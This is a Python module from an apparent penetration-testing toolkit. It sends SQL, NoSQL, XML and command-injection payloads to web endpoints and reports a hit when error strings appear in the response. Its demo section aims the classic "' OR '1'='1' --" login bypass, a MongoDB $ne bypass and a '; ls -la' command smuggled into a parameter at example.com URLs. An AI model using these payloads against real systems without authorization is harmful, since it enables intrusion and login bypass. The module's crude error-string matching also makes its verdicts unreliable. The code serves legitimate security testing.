"""
modules/pentesting_tools/data_injection_tools.py

Tools for simulating and testing data injection techniques, including SQL, NoSQL, XML, and Command injections.
"""

import requests
from typing import Dict, Any


class DataInjectionTools:
    """
    A class to simulate various data injection attacks for penetration testing purposes.
    """

    @staticmethod
    def sql_injection_test(url: str, payload: str, params: Dict[str, str]) -> bool:
        """
        Test for SQL injection vulnerabilities by injecting payloads into HTTP parameters.
        :param url: Target URL.
        :param payload: SQL injection payload.
        :param params: HTTP GET parameters.
        :return: True if a vulnerability is detected, False otherwise.
        """
        print(f"Testing SQL Injection on {url} with payload: {payload}")
        try:
            injected_params = {key: (value + payload) for key, value in params.items()}
            response = requests.get(url, params=injected_params)
            if "SQL syntax" in response.text or "database error" in response.text:
                print("SQL Injection vulnerability detected.")
                return True
            print("No SQL Injection vulnerability detected.")
            return False
        except Exception as e:
            print(f"Error during SQL injection test: {e}")
            return False

    @staticmethod
    def nosql_injection_test(url: str, payload: Dict[str, Any], headers: Dict[str, str] = None) -> bool:
        """
        Test for NoSQL injection vulnerabilities.
        :param url: Target URL.
        :param payload: NoSQL injection payload.
        :param headers: Optional HTTP headers.
        :return: True if a vulnerability is detected, False otherwise.
        """
        print(f"Testing NoSQL Injection on {url} with payload: {payload}")
        try:
            response = requests.post(url, json=payload, headers=headers)
            if "error" in response.text or "unexpected" in response.text:
                print("NoSQL Injection vulnerability detected.")
                return True
            print("No NoSQL Injection vulnerability detected.")
            return False
        except Exception as e:
            print(f"Error during NoSQL injection test: {e}")
            return False

    @staticmethod
    def xml_injection_test(url: str, xml_payload: str, headers: Dict[str, str] = None) -> bool:
        """
        Test for XML injection vulnerabilities.
        :param url: Target URL.
        :param xml_payload: Malicious XML payload.
        :param headers: Optional HTTP headers.
        :return: True if a vulnerability is detected, False otherwise.
        """
        print(f"Testing XML Injection on {url} with payload: {xml_payload}")
        try:
            if headers is None:
                headers = {"Content-Type": "application/xml"}
            response = requests.post(url, data=xml_payload, headers=headers)
            if "error" in response.text or "XML" in response.text:
                print("XML Injection vulnerability detected.")
                return True
            print("No XML Injection vulnerability detected.")
            return False
        except Exception as e:
            print(f"Error during XML injection test: {e}")
            return False

    @staticmethod
    def command_injection_test(url: str, param_name: str, payload: str, method: str = "GET") -> bool:
        """
        Test for Command injection vulnerabilities.
        :param url: Target URL.
        :param param_name: Parameter name to inject the payload.
        :param payload: Command injection payload.
        :param method: HTTP method to use ("GET" or "POST").
        :return: True if a vulnerability is detected, False otherwise.
        """
        print(f"Testing Command Injection on {url} with payload: {payload}")
        try:
            if method.upper() == "GET":
                response = requests.get(url, params={param_name: payload})
            elif method.upper() == "POST":
                response = requests.post(url, data={param_name: payload})
            else:
                print(f"Unsupported HTTP method: {method}")
                return False
            if "command not found" in response.text or "syntax error" in response.text:
                print("Command Injection vulnerability detected.")
                return True
            print("No Command Injection vulnerability detected.")
            return False
        except Exception as e:
            print(f"Error during Command injection test: {e}")
            return False


class DataInjectionTester:
    """
    A class to test data injection techniques.
    """

    @staticmethod
    def run_tests():
        """
        Runs tests for data injection vulnerabilities.
        """
        print("Running data injection tests...")

        # SQL Injection Test
        DataInjectionTools.sql_injection_test(
            url="http://example.com/login",
            payload="' OR '1'='1' --",
            params={"username": "test", "password": "test"}
        )

        # NoSQL Injection Test
        DataInjectionTools.nosql_injection_test(
            url="http://example.com/api",
            payload={"username": {"$ne": None}, "password": {"$ne": None}},
            headers={"Content-Type": "application/json"}
        )

        # XML Injection Test
        DataInjectionTools.xml_injection_test(
            url="http://example.com/xml",
            xml_payload="<test><malicious>&send;</malicious></test>"
        )

        # Command Injection Test
        DataInjectionTools.command_injection_test(
            url="http://example.com/exec",
            param_name="cmd",
            payload="; ls -la",
            method="GET"
        )


if __name__ == "__main__":
    # Run injection tests
    DataInjectionTester.run_tests()
